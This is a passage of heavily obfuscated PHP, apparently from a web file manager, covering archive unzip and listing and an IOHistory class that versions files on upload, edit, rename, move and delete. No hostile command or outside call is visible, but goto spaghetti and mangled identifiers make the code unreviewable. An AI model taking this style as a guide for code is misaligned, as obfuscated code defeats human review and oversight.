(!$BÙ›šÁà›‰) { del_dir($aùìïŸ ²Æ); show_json(LNG($aÛÛ¸ÕË[1059]), !1); } del_dir($aùìïŸ ²Æ); return $BÙ›šÁà›‰; goto aÔô«ô±½; aÔô«ô±½: } public static function unzip($EÛ¨Õ·×•×, $cˆ¡Õ‹ ß— = "\162\145\160\154\141\x63\x65") { goto aëÏù…Ğ©­; aëÏù…Ğ©­: $b·‡ã ÆĞÕ =& $_SERVER[òÀöí]; $eäÛó¡¯µ = $EÛ¨Õ·×•×[$b·‡ã ÆĞÕ[75]]; $D”–é„‚ = $EÛ¨Õ·×•×[$b·‡ã ÆĞÕ[1060]]; goto CÕØÂ¤¹; CÕØÂ¤¹: if (!($CĞ«¾¾ì‰È = parent::info($eäÛó¡¯µ))) { show_json(LNG($b·‡ã ÆĞÕ[1061]), !1); } if (!($b­‚¾¢êÛì = parent::infoFull($D”–é„‚))) { $D”–é„‚ = parent::mkdir($D”–é„‚); $b­‚¾¢êÛì = array($b·‡ã ÆĞÕ[75] => $D”–é„‚); } else { if (isset($b­‚¾¢êÛì[$b·‡ã ÆĞÕ[387]]) && trim($b­‚¾¢êÛì[$b·‡ã ÆĞÕ[75]], $b·‡ã ÆĞÕ[8]) != trim($D”–é„‚, $b·‡ã ÆĞÕ[8])) { $cšØÊñğ¡Û = KodIO::make($b­‚¾¢êÛì[$b·‡ã ÆĞÕ[479]]); $fÜ…°®¨×¾ = parent::fileNameAuto($cšØÊñğ¡Û, $b­‚¾¢êÛì[$b·‡ã ÆĞÕ[28]], REPEAT_RENAME_FOLDER, !0); $D”–é„‚ = parent::mkdir($cšØÊñğ¡Û . $fÜ…°®¨×¾); $b­‚¾¢êÛì = array($b·‡ã ÆĞÕ[75] => $D”–é„‚); } } $D”–é„‚ = $b­‚¾¢êÛì[$b·‡ã ÆĞÕ[75]]; goto E‚š“†ãÁ‡; föÕ¯È©µ: return !0; goto B•Çô‘²é‡; E´­»¤Š§: mk_dir($aò÷¹ç“ç÷); $DªÁà¿¶Õ = self::fileExt($CĞ«¾¾ì‰È); $eÓ©¾’³ÚÜ = $aò÷¹ç“ç÷ . $b·‡ã ÆĞÕ[94] . $DªÁà¿¶Õ; goto BíÊ½‚ßÙÍ; BíÊ½‚ßÙÍ: if (!@file_exists(self::iconvSystem($eÓ©¾’³ÚÜ))) { $aÓ³†³Â“ = self::localFilePath($eäÛó¡¯µ, $DªÁà¿¶Õ); $eÓ©¾’³ÚÜ = $aÓ³†³Â“ ? $aÓ³†³Â“ : parent::download($eäÛó¡¯µ, $eÓ©¾’³ÚÜ); } $eÓ©¾’³ÚÜ = self::iconvSystem($eÓ©¾’³ÚÜ); $F˜Å©é²ƒ÷ = isset($EÛ¨Õ·×•×[$b·‡ã ÆĞÕ[1062]]) ? $EÛ¨Õ·×•×[$b·‡ã ÆĞÕ[1062]] : $b·‡ã ÆĞÕ[1063]; goto B¬ ¬¦”õ; dò„ùÅÚÈå: foreach ($Dì£‚®“ğ¤ as $dàõ¿ñ’·¨) { $dàõ¿ñ’·¨ = self::iconvApp($dàõ¿ñ’·¨); self::move($dàõ¿ñ’·¨, $D”–é„‚, $cˆ¡Õ‹ ß—); } del_dir($aò÷¹ç“ç÷); if (!$aÓ³†³Â“) { del_file($eÓ©¾’³ÚÜ); } goto föÕ¯È©µ; E‚š“†ãÁ‡: $EÕ›’Ê½Ÿ… = self::tmpFileName($CĞ«¾¾ì‰È); $aò÷¹ç“ç÷ = TEMP_FILES . $EÕ›’Ê½Ÿ…; del_dir($aò÷¹ç“ç÷); goto E´­»¤Š§; AÜ©Ø¾È—“: Hook::trigger($b·‡ã ÆĞÕ[1067], $aò÷¹ç“ç÷); recursion_dir($aò÷¹ç“ç÷, $BÇœˆÅ¨¶Ğ, $e‡Òà¼¯Æ, 0); $Dì£‚®“ğ¤ = array_merge($BÇœˆÅ¨¶Ğ, $e‡Òà¼¯Æ); goto dò„ùÅÚÈå; B¬ ¬¦”õ: $a¯”¸Ö—Ïò = KodArchive::extract($eÓ©¾’³ÚÜ, $aò÷¹ç“ç÷ . $b·‡ã ÆĞÕ[8], $F˜Å©é²ƒ÷); self::archiveExt(); if (!$a¯”¸Ö—Ïò[$b·‡ã ÆĞÕ[1064]]) { show_json($b·‡ã ÆĞÕ[1065] . $a¯”¸Ö—Ïò[$b·‡ã ÆĞÕ[1066]], !1); } goto AÜ©Ø¾È—“; B•Çô‘²é‡: } public static function unzipList($Då‘ßÒ÷á) { goto fÖË²ì¯Óê; D–”ùÆñøå: $e¦©‡œ´¿ø = self::info($Fã¿‹Æ­ÏÄ); $e‚†‘Ø“³Ç = self::fileExt($e¦©‡œ´¿ø); $D½Ğæğè˜ = self::tmpFileName($e¦©‡œ´¿ø); goto dËÆ¾Á‡»“; eÄ­£ÄœÂ”: self::archiveExt(); del_dir($fÌğàÔµ£Œ); if (!$fÛçªèêÌ[$E…ÄÛĞŞÔ™[1064]]) { show_json($fÛçªèêÌ[$E…ÄÛĞŞÔ™[1066]], !1); } goto eàø§Ö¸òİ; dËÆ¾Á‡»“: if (isset($cİŸÏè‘±)) { $Cñè­çë—˜ = array($cİŸÏè‘±[$E…ÄÛĞŞÔ™[75]], $cİŸÏè‘±[$E…ÄÛĞŞÔ™[1068]], $cİŸÏè‘±[$E…ÄÛĞŞÔ™[28]]); $dÜ´¸—ì×à = md5(implode($E…ÄÛĞŞÔ™[70], $Cñè­çë—˜)) . $E…ÄÛĞŞÔ™[94] . get_path_ext($cİŸÏè‘±[$E…ÄÛĞŞÔ™[28]]); } else { $Cñè­çë—˜ = array($e¦©‡œ´¿ø[$E…ÄÛĞŞÔ™[28]], $e¦©‡œ´¿ø[$E…ÄÛĞŞÔ™[75]], $e¦©‡œ´¿ø[$E…ÄÛĞŞÔ™[77]]); $dÜ´¸—ì×à = md5(implode($E…ÄÛĞŞÔ™[70], $Cñè­çë—˜)) . $E…ÄÛĞŞÔ™[94] . $e‚†‘Ø“³Ç; } if ($F÷ µŸÛ’ == -1) { $BÀøø²î´ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\x69\x65\x77\x2f{$D½Ğæğè˜}\x2f{$dÜ´¸—ì×à}\56\x6c\157\147"; $c´×¢’øòî = self::infoFull($BÀøø²î´); if ($c´×¢’øòî) { $BÀøø²î´ = $c´×¢’øòî[$E…ÄÛĞŞÔ™[75]]; $eŠ†òİîæ = self::getContent($BÀøø²î´); if ($eŠ†òİîæ) { $FŒ¾•¤˜§Å = json_decode($eŠ†òİîæ, !0); if (count($FŒ¾•¤˜§Å) >= $DßŞ†ë›Â¯) { show_json(sprintf(LNG($E…ÄÛĞŞÔ™[1070]), count($FŒ¾•¤˜§Å)), !1); } return $FŒ¾•¤˜§Å; } } else { $BÀøø²î´ = self::mkfile($BÀøø²î´); } } $fÌğàÔµ£Œ = TEMP_FILES . $D½Ğæğè˜; goto cäê•‡ÙÑÊ; cäê•‡ÙÑÊ: if (!is_dir($fÌğàÔµ£Œ)) { mk_dir($fÌğàÔµ£Œ); } $dé¾£ÖãíØ = $fÌğàÔµ£Œ . $E…ÄÛĞŞÔ™[8] . $dÜ´¸—ì×à; if (!@file_exists(self::iconvSystem($dé¾£ÖãíØ))) { if (isset($cİŸÏè‘±)) { url_request($Cä¿“«‡Ä, $E…ÄÛĞŞÔ™[1071], $dé¾£ÖãíØ); } else { $Fù¨Ö„»¦š = self::localFilePath($Cä¿“«‡Ä, $e‚†‘Ø“³Ç); $dé¾£ÖãíØ = $Fù¨Ö„»¦š ? $Fù¨Ö„»¦š : self::download($Cä¿“«‡Ä, $dé¾£ÖãíØ); } } goto a²Á±Òñ…Ò; a²Á±Òñ…Ò: $dé¾£ÖãíØ = self::iconvSystem($dé¾£ÖãíØ); if ($F÷ µŸÛ’ >= 0) { $E½ËÂè§Àß = isset($Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[1072]]) ? $Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[1072]] : !1; $Eù¡…¼êŒ = isset($Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[28]]) ? $Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[28]] : $E…ÄÛĞŞÔ™[33]; KodArchive::filePreview($dé¾£ÖãíØ, $F÷ µŸÛ’, $E½ËÂè§Àß, $Eù¡…¼êŒ); self::archiveExt(); die; } $fÛçªèêÌ = KodArchive::listContent($dé¾£ÖãíØ); goto eÄ­£ÄœÂ”; E«Şò£ˆ‘: return $fÛçªèêÌ[$E…ÄÛĞŞÔ™[1066]]; goto AÍİƒ…«Š; eàø§Ö¸òİ: $FŒ¾•¤˜§Å = json_encode($fÛçªèêÌ[$E…ÄÛĞŞÔ™[1066]]); self::setContent($BÀøø²î´, $FŒ¾•¤˜§Å); if (count($fÛçªèêÌ[$E…ÄÛĞŞÔ™[1066]]) >= $DßŞ†ë›Â¯) { show_json(sprintf(LNG($E…ÄÛĞŞÔ™[1070]), count($fÛçªèêÌ[$E…ÄÛĞŞÔ™[1066]])), !1); } goto E«Şò£ˆ‘; fÖË²ì¯Óê: $E…ÄÛĞŞÔ™ =& $_SERVER[òÀöí]; $Cä¿“«‡Ä = $Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[75]]; $F÷ µŸÛ’ = isset($Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[1068]]) ? $Då‘ßÒ÷á[$E…ÄÛĞŞÔ™[1068]] : -1; goto bˆˆ­»Ï”©; bˆˆ­»Ï”©: $DßŞ†ë›Â¯ = 50000; if (request_url_safe($Cä¿“«‡Ä)) { $cİŸÏè‘± = parse_url_query($Cä¿“«‡Ä); if (!isset($cİŸÏè‘±[$E…ÄÛĞŞÔ™[75]])) { show_json($E…ÄÛĞŞÔ™[1069], !1); } } $Fã¿‹Æ­ÏÄ = isset($cİŸÏè‘±) ? $cİŸÏè‘±[$E…ÄÛĞŞÔ™[75]] : $Cä¿“«‡Ä; goto D–”ùÆñøå; AÍİƒ…«Š: } private static function fileExt($c¥Ò£àí»Ú) { $fÈÛö•âˆÎ =& $_SERVER[òÀöí]; $Aš¿„ä¨µ’ = $c¥Ò£àí»Ú[$fÈÛö•âˆÎ[167]]; if ($Aš¿„ä¨µ’ == $fÈÛö•âˆÎ[1073]) { $d¦ªî±Ò² = $fÈÛö•âˆÎ[1074]; if (substr($c¥Ò£àí»Ú[$fÈÛö•âˆÎ[28]], -strlen($d¦ªî±Ò²)) == $d¦ªî±Ò²) { $Aš¿„ä¨µ’ = $fÈÛö•âˆÎ[1075]; } } self::archiveExt($Aš¿„ä¨µ’); return $Aš¿„ä¨µ’; } private static function zipFileList($Fº±°·®‡, $Bè¸àëÈÕå = false) { $eÌ×Ç¼ó°Š =& $_SERVER[òÀöí]; $bó£ Á´Ï‡ = array(); foreach ($Fº±°·®‡ as $b¹é‘Ìíää) { $EÆ×§±¨Ü = $b¹é‘Ìíää[$eÌ×Ç¼ó°Š[75]]; if ($Bè¸àëÈÕå) { $EÆ×§±¨Ü = self::copy($b¹é‘Ìíää[$eÌ×Ç¼ó°Š[75]], $Bè¸àëÈÕå, $eÌ×Ç¼ó°Š[771]); } else { $B·Õ±ÁøêÑ = self::init($b¹é‘Ìíää[$eÌ×Ç¼ó°Š[75]]); if ($B·Õ±ÁøêÑ->getType() == $eÌ×Ç¼ó°Š[105]) { $EÆ×§±¨Ü = $B·Õ±ÁøêÑ->path; } } if ($EÆ×§±¨Ü && self::local()->exist($EÆ×§±¨Ü)) { $bó£ Á´Ï‡[$b¹é‘Ìíää[$eÌ×Ç¼ó°Š[75]]] = $EÆ×§±¨Ü; } } if (!empty($bó£ Á´Ï‡)) { return array_values($bó£ Á´Ï‡); } show_json(LNG($eÌ×Ç¼ó°Š[1039]), !1); } public static function tmpFileName($B“§çÍ‰Í) { $F‘ç•Ø«ŸÊ =& $_SERVER[òÀöí]; $Bœ§á£Õå´ = array($B“§çÍ‰Í[$F‘ç•Ø«ŸÊ[28]], $B“§çÍ‰Í[$F‘ç•Ø«ŸÊ[75]], $B“§çÍ‰Í[$F‘ç•Ø«ŸÊ[77]], $B“§çÍ‰Í[$F‘ç•Ø«ŸÊ[477]]); return md5(implode($F‘ç•Ø«ŸÊ[70], $Bœ§á£Õå´)); } private static function localFilePath($aÎ¥ëæÒ§í, $CÊ´œšá) { goto a•ÆÃ¦ÁÚ×; a´øš§×º: if ($E¯î­óöƒÜ[$AÖøîÃŸŞ[29]] == KodIO::KOD_SOURCE) { $c’Ï³š”Œ = Model($AÖøîÃŸŞ[778])->fileInfoGet(KodIO::sourceID($aÎ¥ëæÒ§í)); if (!$c’Ï³š”Œ[$AÖøîÃŸŞ[75]]) { show_json($AÖøîÃŸŞ[1078], !1); } $aÎ¥ëæÒ§í = $c’Ï³š”Œ[$AÖøîÃŸŞ[75]]; } $bÀ¤šæ•ŒÃ = self::init($aÎ¥ëæÒ§í); $EÇ°Êë§Øà = $bÀ¤šæ•ŒÃ->getType(); goto c‘ñ¾³øè´; a•ÆÃ¦ÁÚ×: $AÖøîÃŸŞ =& $_SERVER[òÀöí]; if ($CÊ´œšá == $AÖøîÃŸŞ[1076] && strtoupper(substr(PHP_OS, 0, 3)) == $AÖøîÃŸŞ[1077]) { return !1; } $E¯î­óöƒÜ = KodIO::parse($aÎ¥ëæÒ§í); goto a´øš§×º; c‘ñ¾³øè´: if ($EÇ°Êë§Øà == $AÖøîÃŸŞ[105] || $EÇ°Êë§Øà == $AÖøîÃŸŞ[1079]) { if (!$bÀ¤šæ•ŒÃ->exist($bÀ¤šæ•ŒÃ->path)) { show_json(LNG($AÖøîÃŸŞ[104]), !1); } return $bÀ¤šæ•ŒÃ->path; } return !1; goto eæåÀğ¬ª; eæåÀğ¬ª: } private static function archiveExt($BÀÍĞê´Öñ = '') { $GLOBALS[$_SERVER[òÀöí][1080]] = $BÀÍĞê´Öñ; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto bÄŠ¿ÏÙ´Ş; cÊ–ù’–õ´: if (isset($_REQUEST[$AÇ×½¡ãŒÎ[1082]]) && $_REQUEST[$AÇ×½¡ãŒÎ[1082]] == $AÇ×½¡ãŒÎ[86]) { return; } Hook::bind($AÇ×½¡ãŒÎ[1083], $AÇ×½¡ãŒÎ[1084]); Hook::bind($AÇ×½¡ãŒÎ[1085], $AÇ×½¡ãŒÎ[1086]); goto b‘íÂğÛ¦; AÅ÷¯¤¥Ş¸: Hook::bind($AÇ×½¡ãŒÎ[1093], $AÇ×½¡ãŒÎ[1094]); goto BÎÄŞƒîÍÀ; b‘íÂğÛ¦: Hook::bind($AÇ×½¡ãŒÎ[1087], $AÇ×½¡ãŒÎ[1088]); Hook::bind($AÇ×½¡ãŒÎ[1089], $AÇ×½¡ãŒÎ[1090]); Hook::bind($AÇ×½¡ãŒÎ[1091], $AÇ×½¡ãŒÎ[1092]); goto AÅ÷¯¤¥Ş¸; bÄŠ¿ÏÙ´Ş: $AÇ×½¡ãŒÎ =& $_SERVER[òÀöí]; $aÄ±Ûœ†µ = $GLOBALS[$AÇ×½¡ãŒÎ[6]][$AÇ×½¡ãŒÎ[87]][$AÇ×½¡ãŒÎ[1081]]; if ($aÄ±Ûœ†µ <= 0) { return; } goto cÊ–ù’–õ´; BÎÄŞƒîÍÀ: } public static function eventBeforeUpload($DÄ·‹Û²‹Ã) { if ($DÄ·‹Û²‹Ã[3] && $DÄ·‹Û²‹Ã[3] != REPEAT_REPLACE) { return; } $eì¯àšà©¹ = self::parsePath($DÄ·‹Û²‹Ã[0]); if (!$eì¯àšà©¹) { return; } self::add($eì¯àšà©¹); } public static function eventBeforeEdit($eƒç·ˆ©ïÆ) { $b®öƒïÆµš = self::parsePath($eƒç·ˆ©ïÆ[0]); if (!$b®öƒïÆµš) { return; } self::add($b®öƒïÆµš); } public static function eventBeforeCopyFile($fÏ™œÜˆÍÀ, $BÑÄ‘‰®–Ã, $dÅŞÈ¢Ô£’, $cÛç§øÑ÷ó, $aÙÏ•••êˆ, $E¦®©åèè©) { $A×®ù«ƒø‰ = $dÅŞÈ¢Ô£’->getPathOuter($cÛç§øÑ÷ó); $BŞÌ·¯‚‡µ = self::parsePath($A×®ù«ƒø‰); if (!$BŞÌ·¯‚‡µ) { return; } self::add($BŞÌ·¯‚‡µ); } public static function eventBeforeRename($f’Éç¼½õô) { $aøå·ÔØ  =& $_SERVER[òÀöí]; $D¹ïÏĞ´™  = self::parsePath($f’Éç¼½õô[0]); if (!$D¹ïÏĞ´™ ) { return; } $BŠÎÕ ÅŸ = self::checkInHistory($D¹ïÏĞ´™ ); if (!$BŠÎÕ ÅŸ) { return; } if ($BŠÎÕ ÅŸ[$aøå·ÔØ [29]] == $aøå·ÔØ [173]) { $cØ‚‡ŠÒØÂ = self::listData($D¹ïÏĞ´™ ); if ($cØ‚‡ŠÒØÂ && $cØ‚‡ŠÒØÂ[$aøå·ÔØ [363]]) { self::moveHistory($D¹ïÏĞ´™ , $f’Éç¼½õô[1]); } } else { IO::rename($BŠÎÕ ÅŸ[$aøå·ÔØ [75]], $f’Éç¼½õô[1]); } } public static function eventBeforeMove($E®–½“÷) { goto DõÓõïÍÇØ; DõÓõïÍÇØ: $Dì±´ÉŒÏŒ =& $_SERVER[òÀöí]; $cÎÙàğ…¬á = self::parsePath($E®–½“÷[0]); if (!$cÎÙàğ…¬á) { return; } goto C£‰Û‚ë‚‚; C£‰Û‚ë‚‚: $dˆØ”×ßÄ = self::parsePath($E®–½“÷[1]); if (!$dˆØ”×ßÄ) { return; } $CÊ¿­±¾Õ­ = $E®–½“÷[3]; goto eì·¸•·‡´; E« í„Š†ƒ: if ($e“ã¦­¦à[$Dì±´ÉŒÏŒ[29]] == $Dì±´ÉŒÏŒ[173]) { $dëÆ„è­ = self::listData($cÎÙàğ…¬á); $b°Û„ÔßÂ = rtrim($dˆØ”×ßÄ, $Dì±´ÉŒÏŒ[8]) . $Dì±´ÉŒÏŒ[8] . ($CÊ¿­±¾Õ­ ? $CÊ¿­±¾Õ­ : get_path_this($cÎÙàğ…¬á)); $Bİ ƒê¼… = self::listData($b°Û„ÔßÂ); if ($dëÆ„è­ && $dëÆ„è­[$Dì±´ÉŒÏŒ[363]] && $Bİ ƒê¼… && $Bİ ƒê¼…[$Dì±´ÉŒÏŒ[363]]) { return self::clear($cÎÙàğ…¬á); } if ($dëÆ„è­ && $dëÆ„è­[$Dì±´ÉŒÏŒ[363]]) { self::moveHistory($cÎÙàğ…¬á, $CÊ¿­±¾Õ­, $E‡†›õ³¥õ); } } else { IO::move($e“ã¦­¦à[$Dì±´ÉŒÏŒ[75]], $E‡†›õ³¥õ, !1, $CÊ¿­±¾Õ­); self::clearEmptyFolder(IO::pathFather($e“ã¦­¦à[$Dì±´ÉŒÏŒ[75]])); } goto CŞ«ˆ£ÖÚ; eì·¸•·‡´: $e“ã¦­¦à = self::checkInHistory($cÎÙàğ…¬á); if (!$e“ã¦­¦à) { return; } $E‡†›õ³¥õ = self::pathHistory($dˆØ”×ßÄ); goto E« í„Š†ƒ; CŞ«ˆ£ÖÚ: } public static function eventAfterRemove($dˆœƒå¿ó, $FîËÒîë‡) { goto a´ÏÎ ŒÛö; d¯Ášç‡Ó: if ($Cõ¡ŒÖğØï[$F†ÕĞ“â¦˜[29]] == $F†ÕĞ“â¦˜[173]) { $B¼‘¿ª›Æ¬ = self::listData($d ŸÚ°±âİ, !1); if ($B¼‘¿ª›Æ¬ && $B¼‘¿ª›Æ¬[$F†ÕĞ“â¦˜[363]]) { self::clear($d ŸÚ°±âİ, !1); } } else { IO::remove($Cõ¡ŒÖğØï[$F†ÕĞ“â¦˜[75]]); self::clearEmptyFolder(IO::pathFather($Cõ¡ŒÖğØï[$F†ÕĞ“â¦˜[75]])); } goto bô‡ õ”Ë; a´ÏÎ ŒÛö: $F†ÕĞ“â¦˜ =& $_SERVER[òÀöí]; if (!$FîËÒîë‡) { return; } $d ŸÚ°±âİ = self::parsePath($dˆœƒå¿ó[0]); goto Bòù§ÃƒÇõ; Bòù§ÃƒÇõ: if (!$d ŸÚ°±âİ) { return; } $Cõ¡ŒÖğØï = self::checkInHistory($d ŸÚ°±âİ); if (!$Cõ¡ŒÖğØï) { return; } goto d¯Ášç‡Ó; bô‡ õ”Ë: } private static function checkInHistory($EÀ†ƒ›¤È) { $e˜¬§«µê = self::pathHistory($EÀ†ƒ›¤È); if (!IO::exist($e˜¬§«µê)) { $e˜¬§«µê .= $_SERVER[òÀöí][1095]; } return IO::exist($e˜¬§«µê) ? IO::info($e˜¬§«µê) : !1; } private static function parsePath($E¸ôó‚Ã”ä) { goto cŞñ±Ë¼Ì; fèæ’³‡: return $E¸ôó‚Ã”ä; goto CÊºÚ´Êá; cŞñ±Ë¼Ì: $D„¢çïÓ±´ =& $_SERVER[òÀöí]; if (!$E¸ôó‚Ã”ä) { return !1; } if ($GLOBALS[$D„¢çïÓ±´[1096]]) { return; } goto AÓ†ö¡ÃŠĞ; FŠóÊÊÓŒ: $EØ¼ÙºÕå = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $D„¢çïÓ±´[1098]); foreach ($EØ¼ÙºÕå as $d¬ï³…°¶ë) { if (!$FÚŸ…Éâ½ && substr($E¸ôó‚Ã”ä, 0, strlen($d¬ï³…°¶ë)) == $d¬ï³…°¶ë) { return !1; } } self::log($GLOBALS[$D„¢çïÓ±´[1021]] . $D„¢çïÓ±´[1099] . $E¸ôó‚Ã”ä); goto fèæ’³‡; AÓ†ö¡ÃŠĞ: $fˆÍ‰˜ë²„ = KodIO::parse($E¸ôó‚Ã”ä); $FÚŸ…Éâ½ = $fˆÍ‰˜ë²„[$D„¢çïÓ±´[29]]; $EŒ›‘ôí™— = !$FÚŸ…Éâ½ || $FÚŸ…Éâ½ == KodIO::KOD_IO || $FÚŸ…Éâ½ == KodIO::KOD_SHARE_ITEM; goto bÍÀ’Şê§; bÍÀ’Şê§: if (!$EŒ›‘ôí™— || !$fˆÍ‰˜ë²„[$D„¢çïÓ±´[1097]]) { return !1; } if ($FÚŸ…Éâ½ == KodIO::KOD_SHARE_ITEM) { $Eš‚øÀƒ¿¨ = IO::init($E¸ôó‚Ã”ä); if ($Eš‚øÀƒ¿¨->pathParse[$D„¢çïÓ±´[1026]]) { return self::parsePath($Eš‚øÀƒ¿¨->pathParse[$D„¢çïÓ±´[1026]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto FŠóÊÊÓŒ; CÊºÚ´Êá: } private static function pathHistory($Eñ¥Ï–ß³) { $D® ¼¾÷‰ =& $_SERVER[òÀöí]; $béÙ¸‰ñ è = self::$_historyBase . ltrim(KodIO::clear($Eñ¥Ï–ß³), $D® ¼¾÷‰[8]); $béÙ¸‰ñ è = str_replace(array($D® ¼¾÷‰[1100]), array($D® ¼¾÷‰[1101]), $béÙ¸‰ñ è); return $béÙ¸‰ñ è; } public static function log($f„È˜•°Ù) { } public static function historyCount($C‘¡åØ) { $E…áÊÜ…î› =& $_SERVER[òÀöí]; $FÊ„Úëšİá = array(); $A–Š¶Ê’ = array(); foreach ($C‘¡åØ as $B¢«èÌ…Â­) { $D‘™¥ÖÛºï = get_path_father($B¢«èÌ…Â­); if (!$A–Š¶Ê’[$D‘™¥ÖÛºï]) { $A–Š¶Ê’[$D‘™¥ÖÛºï] = array(); } $A–Š¶Ê’[$D‘™¥ÖÛºï][] = get_path_this($B¢«èÌ…Â­); } foreach ($A–Š¶Ê’ as $D‘™¥ÖÛºï => $a›’åùŞ³) { $f¿ºäšİŒ = self::parsePath($D‘™¥ÖÛºï); if (!$f¿ºäšİŒ) { continue; } foreach ($a›’åùŞ³ as $A¹±¹ƒ§ÚÌ) { $Fï’¸î = self::listData(rtrim($f¿ºäšİŒ, $E…áÊÜ…î›[8]) . $E…áÊÜ…î›[8] . $A¹±¹ƒ§ÚÌ, !1); if ($Fï’¸î && $Fï’¸î[$E…áÊÜ…î›[363]]) { $FÊ„Úëšİá[rtrim($D‘™¥ÖÛºï, $E…áÊÜ…î›[8]) . $E…áÊÜ…î›[8] . $A¹±¹ƒ§ÚÌ] = count($Fï’¸î[$E…áÊÜ…î›[363]]); } } } return $FÊ„Úëšİá; } public static function add($fäˆÔ’ƒƒÇ) { goto aÍ§ÅØ·Ç‹; d¿õ£Ğ®‰–: if ($D’ËÉÉï¸ && $D’ËÉÉï¸[0][$a‹ßí‡âƒ[170]] == $F’Ûí‰¬Ñˆ) { return !0; } if (array_key_exists($a‹ßí‡âƒ[194], $EÊ¥…ÏŒõ) && !$EÊ¥…ÏŒõ[$a‹ßí‡âƒ[194]]) { return !1; } $fã×­”Õ¨İ = short_id(time()); goto f‘£ôíŸë; FÀ„Ú•´œ¼: $D’ËÉÉï¸ = $BáñØÆ±˜í[$a‹ßí‡âƒ[363]]; if ($EÊ¥…ÏŒõ[$a‹ßí‡âƒ[77]] == 0) { return; } if ($EÊ¥…ÏŒõ[$a‹ßí‡âƒ[77]] >= 1024 * 1024 * 500) { return !1; } goto d¿õ£Ğ®‰–; e¿¨º²®Üñ: if ($fÓÙ·»åİ <= 0) { return; } $F’Ûí‰¬Ñˆ = IO::hashSimple($fäˆÔ’ƒƒÇ); $EÊ¥…ÏŒõ = IO::info($fäˆÔ’ƒƒÇ); goto FÀ„Ú•´œ¼; A¸‚Ÿê—°: $B„àª³ÖÀ× = Model($a‹ßí‡âƒ[1102])->get($a‹ßí‡âƒ[1103]); $fÓÙ·»åİ = $GLOBALS[$a‹ßí‡âƒ[6]][$a‹ßí‡âƒ[87]][$a‹ßí‡âƒ[1081]]; $bæ·¨Ê÷èÖ = $B„àª³ÖÀ× == $a‹ßí‡âƒ[1104] ? 5 : $fÓÙ·»åİ; goto e¿¨º²®Üñ; CñÓÄª¿Î: return self::saveData($BáñØÆ±˜í[$a‹ßí‡âƒ[1108]], $D’ËÉÉï¸); goto A™í©óÜŸ‹; aÍ§ÅØ·Ç‹: $a‹ßí‡âƒ =& $_SERVER[òÀöí]; $BáñØÆ±˜í = self::listData($fäˆÔ’ƒƒÇ); if (!$BáñØÆ±˜í) { return; } goto A¸‚Ÿê—°; f‘£ôíŸë: $dŠ„ßÜÜî‰ = array($a‹ßí‡âƒ[385] => $fã×­”Õ¨İ, $a‹ßí‡âƒ[170] => $F’Ûí‰¬Ñˆ, $a‹ßí‡âƒ[28] => $EÊ¥…ÏŒõ[$a‹ßí‡âƒ[28]] . $a‹ßí‡âƒ[94] . date($a‹ßí‡âƒ[1105]) . rand_string(1), $a‹ßí‡âƒ[77] => $EÊ¥…ÏŒõ[$a‹ßí‡âƒ[77]], $a‹ßí‡âƒ[396] => USER_ID, $a‹ßí‡âƒ[192] => time(), $a‹ßí‡âƒ[1106] => $a‹ßí‡âƒ[33]); IO::mkdir($BáñØÆ±˜í[$a‹ßí‡âƒ[1107]]); $e Ï®êØø³ = IO::copy($fäˆÔ’ƒƒÇ, $BáñØÆ±˜í[$a‹ßí‡âƒ[1107]], !1, $dŠ„ßÜÜî‰[$a‹ßí‡âƒ[28]]); goto B— ŒËØÓ•; B— ŒËØÓ•: if (!$e Ï®êØø³) { self::clearEmptyFolder($BáñØÆ±˜í[$a‹ßí‡âƒ[1107]]); return !1; } array_unshift($D’ËÉÉï¸, $dŠ„ßÜÜî‰); if (count($D’ËÉÉï¸) > $bæ·¨Ê÷èÖ) { $FëÚÓ¦‚á = array_slice($D’ËÉÉï¸, $bæ·¨Ê÷èÖ); foreach ($FëÚÓ¦‚á as $F˜áí¿¥) { IO::remove($BáñØÆ±˜í[$a‹ßí‡âƒ[1107]] . $F˜áí¿¥[$a‹ßí‡âƒ[28]]); } $D’ËÉÉï¸ = array_slice($D’ËÉÉï¸, 0, $bæ·¨Ê÷èÖ); } goto CñÓÄª¿Î; A™í©óÜŸ‹: } public static function remove($e›âßÇ£†Š, $dÎß‚ôÓæÒ) { $Dš’³’†í‹ =& $_SERVER[òÀöí]; $b¬†´ÁœŸ = self::listData($e›âßÇ£†Š); $FÄ÷…Ó©Á« = array(); if (!$b¬†´ÁœŸ) { return !1; } foreach ($b¬†´ÁœŸ[$Dš’³’†í‹[363]] as $B¦‹‡éé) { if ($B¦‹‡éé[$Dš’³’†í‹[385]] == $dÎß‚ôÓæÒ) { IO::remove($b¬†´ÁœŸ[$Dš’³’†í‹[1107]] . $B¦‹‡éé[$Dš’³’†í‹[28]]); continue; } $FÄ÷…Ó©Á«[] = $B¦‹‡éé; } return self::saveData($b¬†´ÁœŸ[$Dš’³’†í‹[1108]], $FÄ÷…Ó©Á«); } public static function clear($aÇÓ©´æÃ¤, $f¨¿ÄãÁÍ¦ = true) { $C¾‰âŸÄâ =& $_SERVER[òÀöí]; $côÀÀÂù›ç = self::listData($aÇÓ©´æÃ¤, $f¨¿ÄãÁÍ¦); if (!$côÀÀÂù›ç) { return !1; } foreach ($côÀÀÂù›ç[$C¾‰âŸÄâ[363]] as $C£¥”Çöçö) { IO::remove($côÀÀÂù›ç[$C¾‰âŸÄâ[1107]] . $C£¥”Çöçö[$C¾‰âŸÄâ[28]]); } return self::saveData($côÀÀÂù›ç[$C¾‰âŸÄâ[1108]], array()); } public static function moveHistory($d©Ášì’Ì, $bÙ­ÏËÇ–Ø = '', $bä½ÓæÛ‰ƒ = '') { goto eĞêªĞãÄï; D†Å¹éÜÖ: self::saveData($DìäöôÖğ…[$Eİ‰–Ù¹[1108]], $DìäöôÖğ…[$Eİ‰–Ù¹[363]]); self::clearEmptyFolder($DìäöôÖğ…[$Eİ‰–Ù¹[1107]]); goto EÄ‰ê ¹ñÏ; eĞêªĞãÄï: $Eİ‰–Ù¹ =& $_SERVER[òÀöí]; $DìäöôÖğ… = self::listData($d©Ášì’Ì, !1); 